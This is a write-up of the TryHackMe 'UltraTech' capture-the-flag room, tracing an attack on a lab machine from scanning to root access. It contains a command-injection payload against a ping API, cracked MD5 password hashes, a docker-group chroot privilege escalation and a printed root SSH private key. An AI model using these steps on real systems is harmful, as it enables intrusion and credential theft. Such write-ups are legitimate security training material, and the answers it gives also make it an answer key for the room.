# UltraTech

The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing

[UltraTech](https://tryhackme.com/room/ultratech1)

## Topic's

* Network Enumeration
* Web Enumeration
* Web Poking
* Command Injection
* Brute Forcing Hash
* Exploitation Docker

## Task 1 Deploy the machine

**~_. UltraTech ._~**

This room is inspired from real-life vulnerabilities and misconfigurations I encountered during security assessments. If you get stuck at some point, take some time to keep enumerating.

**[ Your Mission ]**

You have been contracted by UltraTech to pentest their infrastructure. It is a grey-box kind of assessment, the only information you have is the company's name and their server's IP address.

Start this room by hitting the "deploy" button on the right!

Good luck and more importantly, have fun!

Lp1 <fenrir.pro>

**[ Extra Information ]**

If you have any comment or question regarding this room, you can contact me on TryHackMe's Discord.

1. Deploy the machine

`No answer needed`

## Task 2 It's enumeration time!

After enumerating the services and resources available on this machine, what did you discover?

```
kali@kali:~/CTFs/tryhackme/UltraTech$ sudo nmap -Pn -sS -sC -sV -p- 10.10.185.130
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 15:44 CEST
Nmap scan report for 10.10.185.130
Host is up (0.041s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.09 seconds
```

1. Which software is using the port 8081?

`Node.js`

2. Which other non-standard port is used?

`31331`

3. Which software using this port?

`Apache`

4. Which GNU/Linux distribution seems to be used?

`Ubuntu`

5. The software using the port 8080 is a REST api, how many of its routes are used by the web application?

```
kali@kali:~/CTFs/tryhackme/UltraTech$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.185.130:8081
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.185.130:8081
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/07 15:53:07 Starting gobuster
===============================================================
/auth (Status: 200)
Progress: 2488 / 4615 (53.91%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/07 15:53:31 Finished
===============================================================
```

```
kali@kali:~/CTFs/tryhackme/UltraTech$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.185.130:31331
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.185.130:31331
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/07 16:17:27 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/favicon.ico (Status: 200)
/images (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/js (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/10/07 16:17:45 Finished
===============================================================
```

* [http://10.10.185.130:31331/js/api.js](http://10.10.185.130:31331/js/api.js)

```js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

`2`

## Task 3 Let the fun begin

Now that you know which services are available, it's time to exploit them!

Did you find somewhere you could try to login? Great!

Quick and dirty login implementations usually goes with poor data management.

There must be something you can do to explore this machine more thoroughly..

1. There is a database lying around, what is its filename?

`http://10.10.185.130:8081/ping?ip=127.0.0.1%20`ls%20-la``

```
ping: utech.db.sqlite: Name or service not known 
```

`utech.db.sqlite`

2. What is the first user's password hash?

* [http://10.10.185.130:8081/ping?ip=127.0.0.1%20`cat%20utech.db.sqlite`](http://10.10.185.130:8081/ping?ip=127.0.0.1%20`cat%20utech.db.sqlite`)

```
ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded 
```

`r00t f357a0c52799563c7c7b76c1e7543a32`

`admin 0d0ea5111e3c1def594c1684e3b9be84`

`f357a0c52799563c7c7b76c1e7543a32`

3. What is the password associated with this hash?

```
kali@kali:~/CTFs/tryhackme/UltraTech$ hashcat f357a0c52799563c7c7b76c1e7543a32 /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz, 512/1493 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=0 -D _unroll'
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f357a0c52799563c7c7b76c1e7543a32:n100906         
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: f357a0c52799563c7c7b76c1e7543a32
Time.Started.....: Wed Oct  7 16:32:18 2020 (4 secs)
Time.Estimated...: Wed Oct  7 16:32:22 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1305.2 kH/s (0.35ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 5244928/14344385 (36.56%)
Rejected.........: 0/5244928 (0.00%)
Restore.Point....: 5242880/14344385 (36.55%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: n1ckos -> n0i4n2g2

Started: Wed Oct  7 16:32:12 2020
Stopped: Wed Oct  7 16:32:24 2020
kali@kali:~/CTFs/tryhackme/UltraTech$ hashcat 0d0ea5111e3c1def594c1684e3b9be84 /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz, 512/1493 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=0 -D _unroll'
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

0d0ea5111e3c1def594c1684e3b9be84:mrsheafy        
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: 0d0ea5111e3c1def594c1684e3b9be84
Time.Started.....: Wed Oct  7 16:33:00 2020 (4 secs)
Time.Estimated...: Wed Oct  7 16:33:04 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1329.7 kH/s (0.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 5345280/14344385 (37.26%)
Rejected.........: 0/5345280 (0.00%)
Restore.Point....: 5343232/14344385 (37.25%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: mrsoutley -> mrsburgy

Started: Wed Oct  7 16:32:56 2020
Stopped: Wed Oct  7 16:33:06 2020
kali@kali:~/CTFs/tryhackme/UltraTech$
```

## Task 4 The root of all evil

Congrats if you've made it this far, you should be able to comfortably run commands on the server by now!

Now's the time for the final step!

You'll be on your own for this one, there is only one question and there might be more than a single way to reach your goal.

Mistakes were made, take advantage of it.

```
kali@kali:~/CTFs/tryhackme/UltraTech$ ssh r00t@10.10.185.130
The authenticity of host '10.10.185.130 (10.10.185.130)' can't be established.
ECDSA key fingerprint is SHA256:RWpgXxl3MyUqAN4AHrH/ntrheh2UzgJMoGAPI+qmGEU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.185.130' (ECDSA) to the list of known hosts.
r00t@10.10.185.130's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct  7 14:38:02 UTC 2020

  System load:  0.03               Processes:           101
  Usage of /:   24.3% of 19.56GB   Users logged in:     0
  Memory usage: 74%                IP address for eth0: 10.10.185.130
  Swap usage:   0%


1 package can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00t@ultratech-prod:~$ ls
r00t@ultratech-prod:~$ ls -la
total 28
drwxr-xr-x 4 r00t r00t 4096 Oct  7 14:38 .
drwxr-xr-x 5 root root 4096 Mar 22  2019 ..
-rw-r--r-- 1 r00t r00t  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 r00t r00t 3771 Apr  4  2018 .bashrc
drwx------ 2 r00t r00t 4096 Oct  7 14:38 .cache
drwx------ 3 r00t r00t 4096 Oct  7 14:38 .gnupg
-rw-r--r-- 1 r00t r00t  807 Apr  4  2018 .profile
r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t: 
Sorry, user r00t may not run sudo on ultratech-prod.
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
^C
r00t@ultratech-prod:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
r00t@ultratech-prod:~$ docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                       PORTS               NAMES
7beaaeecd784        bash                "docker-entrypoint.s…"   18 months ago       Exited (130) 18 months ago                       unruffled_shockley
696fb9b45ae5        bash                "docker-entrypoint.s…"   18 months ago       Exited (127) 18 months ago                       boring_varahamihira
9811859c4c5c        bash                "docker-entrypoint.s…"   18 months ago       Exited (127) 18 months ago                       boring_volhard
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami  
root
# /bin/bash
root@ad624c3147a8:~# ls -a
.  ..  .bash_history  .bashrc  .cache  .emacs.d  .gnupg  .profile  .python_history  .ssh  private.txt
root@ad624c3147a8:~# cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
```

1. What are the first 9 characters of the root user's private SSH key?

`MIIEogIBA`
